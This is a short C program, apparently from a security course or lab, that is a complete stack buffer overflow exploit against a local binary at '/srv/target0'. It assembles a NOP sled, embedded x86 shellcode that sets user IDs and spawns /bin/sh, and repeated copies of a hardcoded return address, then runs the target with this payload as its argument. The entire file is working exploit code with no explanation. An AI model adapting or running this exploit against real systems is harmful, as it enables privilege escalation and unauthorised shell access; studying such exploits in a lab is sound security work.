#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define TARGET "/srv/target0"

static char shellcode[] = 
  "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
  "\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
  "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
  "\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";

const int OFFSET = 408;
const int NOP_COUNT = 200;
const int SHELLCODE_LENGTH = sizeof(shellcode) - 1;
const int RETURN_ADDRESS_COUNT = (OFFSET - NOP_COUNT - SHELLCODE_LENGTH) / 4;
const char* RETURN_ADDRESS = "\xac\xd5\xff\xff";  // 0xffffd5ac

int main(void)
{
  char *args[3];
  char *env[1];

  // Create the exploit string
  char buf[OFFSET + 1];
  memset(buf, 0, sizeof(buf));

  // Add the NOP sled
  memset(buf, '\x90', NOP_COUNT);

  // Add the shellcode
  memcpy(buf + NOP_COUNT, shellcode, SHELLCODE_LENGTH);

  // Add the return addresses
  char *return_address_ptr = buf + NOP_COUNT + SHELLCODE_LENGTH;
  for (int i = 0; i < RETURN_ADDRESS_COUNT; i++) {
    memcpy(return_address_ptr, RETURN_ADDRESS, 4);
    return_address_ptr += 4;
  }

  // Null-terminate the exploit string
  buf[OFFSET] = '\0';

  // Set up the arguments for execve
  args[0] = TARGET;
  args[1] = buf;
  args[2] = NULL;

  env[0] = NULL;

  // Execute the target program with the exploit string
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}